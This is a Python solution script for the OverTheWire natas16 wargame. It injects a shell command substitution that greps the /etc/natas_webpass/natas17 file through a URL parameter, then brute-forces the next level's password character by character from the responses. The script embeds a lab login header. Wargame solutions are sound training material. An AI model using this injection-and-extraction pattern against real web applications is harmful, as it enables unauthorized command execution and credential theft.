#! /usr/bin/python3

import requests

lower_list = "abcdefghijklmnopqrstuvwxyz"
upper_list = lower_list.upper()
char_list = lower_list + upper_list + "1234567890"
payload = "$(grep {} /etc/natas_webpass/natas17)hello"
headers = {"Authorization":"Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="}
url = "http://natas16.natas.labs.overthewire.org/?needle="
password = ""
filtered_charset = ""

"""
print("[+] Getting a list of chars that work with the server.")
for c in char_list:
    r = requests.get(url + payload.format(c), headers=headers)
    if not "hello" in r.text:
        filtered_charset = filtered_charset + c
        print("[+] {} in password".format(c))
        print("[+] current list: " + filtered_charset)
"""
filtered_charset = "bdhkmnsuvBCEHIKLRSUX1790"

print("[+] Cracking the password...")
for i in range(32):
    for c in filtered_charset:
        r = requests.get(url + payload.format(" ^" + password + c), headers=headers)
        if not "hello" in r.text:
            print("[+] Match!")
            password = password + c
            print("[+] Current password: {}".format(password))

print("[+] Finished bruteforcing!")
print("[+] Password for natas17: " + password)
